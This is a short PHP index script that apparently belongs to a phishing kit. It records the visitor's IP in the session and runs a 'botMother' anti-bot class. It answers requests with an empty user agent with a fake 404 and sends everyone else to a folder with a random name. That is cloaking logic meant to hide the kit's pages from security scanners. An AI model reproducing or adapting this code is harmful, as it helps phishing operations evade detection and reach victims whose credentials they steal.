<?php 
session_start();
$_SESSION['passport'] = $_SERVER['REMOTE_ADDR'];

require (__DIR__).'/botMother/botMother.php';
$bm = new botMother;
$bm->run();


$ua = $_SERVER['HTTP_USER_AGENT'];
if($ua == "" OR $ua == " " OR $ua == "  "){
    exit(header("HTTP/1.0 404 Not Found"));
}

header("location: DP7SSKJ3H98JS3XXX");

?>